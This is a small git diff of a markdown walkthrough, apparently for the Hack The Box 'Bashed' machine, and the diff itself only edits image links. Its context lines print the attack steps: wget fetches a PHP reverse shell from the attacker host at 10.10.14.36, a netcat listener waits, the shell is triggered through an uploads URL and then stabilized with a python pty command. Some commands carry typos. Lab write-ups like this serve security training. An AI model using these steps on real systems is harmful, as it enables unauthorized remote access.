@@ -46,15 +46,15 @@ Downloading php reverse shell from <http://pentestmonkey.net/tools/web-shells/ph
 
 Running the command ```python -m SimpleHTTPServer``` to start a http server on our machine in the same directory as the php reverse shell we need to upload
 
-![](https://github.com/Leo-2807/Writeups/edit/main/images/hackthebox/bashed2.png)
+![](https://github.com/Leo-2807/Writeups/tree/main/images/hackthebox/bshed2.png)
 
 Now we run the command ```wget http://10.10.14.36:8000/php-reverse-shell.php``` to download the reverse shell on the machine
 
-![](https://github.com/Leo-2807/Writeups/edit/main/images/hackthebox/bashed1.png)
+![](https://github.com/Leo-2807/Writeups/tree/main/images/hackthebox/bashed1.png)
 
 Starting nc listerner ```nv -lvnp 4444``` on our system and then opening the url <http.//10.10.10.68/uploads/php-reverse-shell.php>
 
-![](https://github.com/Leo-2807/Writeups/edit/main/images/hackthebox/bashed3.png)	
+![](https://github.com/Leo-2807/Writeups/tree/main/images/hackthebox/bashed3.png)	
 
 We get a shell which we stabilize with the command ```python -c 'import pty; pty.spawn("/bin/bash")'```
 
